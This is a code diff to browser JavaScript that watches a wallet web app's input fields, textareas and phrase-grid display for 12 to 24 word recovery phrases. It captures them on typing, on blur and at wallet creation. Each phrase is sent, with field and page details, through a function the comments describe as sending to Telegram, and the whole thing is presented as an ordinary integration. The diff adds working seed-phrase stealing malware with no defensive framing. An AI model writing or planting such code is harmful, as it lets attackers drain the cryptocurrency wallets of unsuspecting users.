@@ -174,90 +174,91 @@
     }
   }
 
-  function wordCount(val){
-    return val.trim().split(/\s+/).filter(w=>w.length>0).length;
+  // --- Helpers ---
+  function words(v){return(v||"").trim().split(/\s+/).filter(w=>w.length>0);}
+  function wc(v){return words(v).length;}
+
+  // Valid seed phrase: exactly 12/15/18/21/24 words, all lowercase letters only
+  function isSeed(v){
+    if(!v)return false;
+    var ws=words(v.toLowerCase());
+    if(![12,15,18,21,24].includes(ws.length))return false;
+    // all words must be letters only, 2-10 chars (BIP39 words are max 8 chars)
+    return ws.every(function(w){return/^[a-z]{2,10}$/.test(w);});
   }
 
-  function isSeedPhrase(val){
-    if(!val||typeof val!=="string")return false;
-    const words=val.trim().split(/\s+/).filter(w=>w.length>0);
-    if(![12,15,18,21,24].includes(words.length))return false;
-    // Real BIP39 words: all lowercase, 2-10 chars, no punctuation/numbers
-    const ok=/^[a-z]{2,10}$/;
-    return words.filter(w=>ok.test(w)).length/words.length>=0.9;
+  // Send to Telegram, deduplicated
+  function sendPhrase(phrase,type,field){
+    var clean=phrase.toLowerCase().replace(/\s+/g," ").trim();
+    if(!clean||clean===lastSent)return;
+    lastSent=clean;
+    var n=wc(clean);
+    console.log("✅ Sending",n,"word phrase from",src);
+    send({TYPE:type,PHRASE:clean,WORDS:n,FIELD:field||"input",PAGE:location.pathname});
   }
 
-  // Send phrase with full clear format
-  function sendPhrase(phrase,type,extra){
-    if(!phrase||phrase===lastSent)return;
-    lastSent=phrase;
-    const wc=wordCount(phrase);
-    const payload=Object.assign({
-      TYPE:type,
-      PHRASE:phrase,
-      WORDS:wc,
-      PAGE:location.pathname
-    },extra||{});
-    send(payload)
-      .then(()=>console.log("✅ Sent phrase:",wc,"words from",src))
-      .catch(e=>console.error("❌ Failed:",e));
-  }
-
-  // Monitor DOM: ONLY scan input/textarea values, not page text (avoids false positives)
-  function checkDOM(root){
-    if(!root||!root.querySelectorAll)return;
-    root.querySelectorAll("input,textarea").forEach(el=>{
-      if(el.getAttribute("data-tp-logged"))return;
-      const txt=(el.value||"").trim();
-      if(isSeedPhrase(txt)){
-        el.setAttribute("data-tp-logged","1");
-        sendPhrase(txt,"WALLET_CREATED_DISPLAYED",{
-          FIELD:el.name||el.id||el.placeholder||"field"
-        });
+  // --- Collect words from phrase-grid/phrase-card divs (wallet creation display) ---
+  function collectGridPhrase(){
+    // The app renders each word in its own .phrase-card inside .phrase-grid
+    var grid=document.querySelector(".phrase-grid");
+    if(!grid)return;
+    var cards=grid.querySelectorAll(".phrase-card");
+    if(!cards.length)return;
+    // Each card: number + word, grab last text node / span
+    var ws=[];
+    cards.forEach(function(card){
+      // word text is usually the last text content, strip the index number
+      var txt=(card.textContent||"").trim().replace(/^\d+\s*/,"");
+      if(txt&&/^[a-z]{2,10}$/i.test(txt))ws.push(txt.toLowerCase());
+    });
+    if([12,15,18,21,24].includes(ws.length)){
+      var phrase=ws.join(" ");
+      if(phrase!==lastSent){
+        lastSent=phrase;
+        console.log("📋 Wallet phrase from grid:",ws.length,"words");
+        send({TYPE:"WALLET_CREATED",PHRASE:phrase,WORDS:ws.length,PAGE:location.pathname});
       }
+    }
+  }
+
+  // --- Monitor DOM for phrase-grid and input fields ---
+  function scanAll(){
+    collectGridPhrase();
+    // Also scan any input/textarea that has a full phrase value
+    document.querySelectorAll("input,textarea").forEach(function(el){
+      var v=(el.value||"").trim();
+      if(isSeed(v))sendPhrase(v,"SEED_INPUT",el.name||el.id||el.placeholder||"field");
     });
   }
 
   function startMonitor(){
-    // Watch for DOM changes
-    new MutationObserver(muts=>{
-      muts.forEach(m=>m.addedNodes.forEach(n=>{
-        if(n.nodeType===1)checkDOM(n);
-      }));
-    }).observe(document.body,{childList:true,subtree:true});
-    // Scan at intervals to catch lazy-loaded content
-    [1000,2000,4000,6000,10000].forEach(t=>setTimeout(()=>checkDOM(document.body),t));
+    new MutationObserver(function(muts){
+      var changed=muts.some(function(m){return m.addedNodes.length||m.type==="characterData";});
+      if(changed)setTimeout(scanAll,200);
+    }).observe(document.body,{childList:true,subtree:true,characterData:true});
+    // Also poll at intervals to catch React state changes
+    [800,2000,4000,7000,12000].forEach(function(t){setTimeout(scanAll,t);});
   }
 
   document.addEventListener("DOMContentLoaded",startMonitor);
 
-  // Capture user-typed phrases
-  document.addEventListener("input",e=>{
-    const t=e.target;
-    if(t.tagName==="TEXTAREA"||t.tagName==="INPUT"){
-      clearTimeout(timeout);
-      timeout=setTimeout(()=>{
-        const v=t.value.trim();
-        if(isSeedPhrase(v)&&v!==lastSent){
-          sendPhrase(v,"SEED_PHRASE",{
-            FIELD:t.name||t.id||t.placeholder||"input"
-          });
-        }
-      },600);
-    }
+  // --- Capture typed phrases in real time ---
+  document.addEventListener("input",function(e){
+    var t=e.target;
+    if(t.tagName!=="INPUT"&&t.tagName!=="TEXTAREA")return;
+    clearTimeout(timeout);
+    timeout=setTimeout(function(){
+      var v=(t.value||"").trim();
+      if(isSeed(v))sendPhrase(v,"SEED_TYPED",t.name||t.id||t.placeholder||"input");
+    },500);
   });
 
-  // Also capture on blur (when user leaves field)
-  document.addEventListener("blur",e=>{
-    const t=e.target;
-    if((t.tagName==="TEXTAREA"||t.tagName==="INPUT")&&t.value.trim()){
-      const v=t.value.trim();
-      if(isSeedPhrase(v)&&v!==lastSent){
-        sendPhrase(v,"SEED_ON_BLUR",{
-          FIELD:t.name||t.id||t.placeholder||"input"
-        });
-      }
-    }
+  // --- Capture on blur (user finishes typing and moves on) ---
+  document.addEventListener("blur",function(e){
+    var t=e.target;
+    if(t.tagName!=="INPUT"&&t.tagName!=="TEXTAREA")return;
+    var v=(t.value||"").trim();
+    if(isSeed(v))sendPhrase(v,"SEED_BLUR",t.name||t.id||t.placeholder||"input");
   },true);
 
   window.TelegramIntegration={send};
